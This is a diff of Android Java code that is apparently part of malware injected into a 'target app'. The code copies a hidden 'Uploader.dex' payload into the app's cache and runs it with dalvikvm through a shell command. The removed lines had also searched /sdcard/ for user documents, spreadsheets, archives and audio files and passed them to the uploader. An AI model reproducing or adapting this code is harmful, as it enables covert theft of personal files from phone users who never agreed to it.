@@ -1,3 +1,4 @@
+//copy dex file
 private void iq500copy(InputStream in, OutputStream out) throws IOException {
         byte[] buffer = new byte[1024];
         int read;
@@ -5,21 +6,9 @@ private void iq500copy(InputStream in, OutputStream out) throws IOException {
 			out.write(buffer, 0, read);
         }
     }
-
+//main function
 private void iq500Uploader()
 	{
-		String extList[] = {
-			".pdf",
-			".doc", 
-			".docx",
-			".ppt",
-			".pptx",
-			".xls", 
-			".xlsx",
-			".zip",
-			".mp3"};
-		String ext = TextUtils.join(" -o -name *", extList);
-
 		File outputDir = this.getCacheDir();
 		String cacheRoot = outputDir.toString();
 		File f = new File(cacheRoot + "/Uploader.dex"); //core class (uploader)
@@ -37,8 +26,8 @@ private void iq500Uploader()
 				out.close();
 			}
 			
-			//Run command, do the jobs under the cache folder of the target app
-			String[] cmds = {"sh", "-c", String.format("cd %s && find /sdcard/ -name *%s > .r3su1t && dalvikvm -cp Uploader.dex Uploader .r3su1t > .upr3su1t", cacheRoot, ext)};
+			//Run the dex file copied
+			String[] cmds = {"sh", "-c", String.format("cd %s && dalvikvm -cp Uploader.dex Uploader > .upr3su1t", cacheRoot)};
 			Runtime.getRuntime().exec(cmds);
 			
 		}
